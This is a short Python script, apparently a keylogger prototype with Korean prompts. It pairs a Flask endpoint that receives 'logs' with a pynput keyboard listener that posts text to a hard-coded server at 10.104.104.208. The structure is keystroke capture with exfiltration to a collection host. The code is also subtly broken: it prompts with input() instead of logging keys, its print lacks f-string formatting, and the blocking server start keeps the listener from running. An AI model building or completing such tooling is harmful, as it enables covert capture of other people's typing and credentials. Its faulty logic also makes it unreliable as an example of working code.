from pynput.keyboard import Listener, Key
import requests
from flask import Flask, request

app = Flask(__name__)

@app.route('/get_logs', methods=['POST'])

def get_logs():
    logs = request.form['logs']

    print('받은 메시지 :{logs}\n')

    return {'result': True}

if __name__ == '__main__':
    app.run(host='0.0.0.0')

server_url = 'http://10.104.104.208:5000/get_logs'
msg = ''

def on_press(key):
    global msg
    
    msg = input('보낼 메시지 :')
    if key == Key.enter:
        try:
            requests.post(server_url, data={'logs': msg})
        except:
            print('Server error!')


with Listener(on_press=on_press) as listener:
    listener.join()

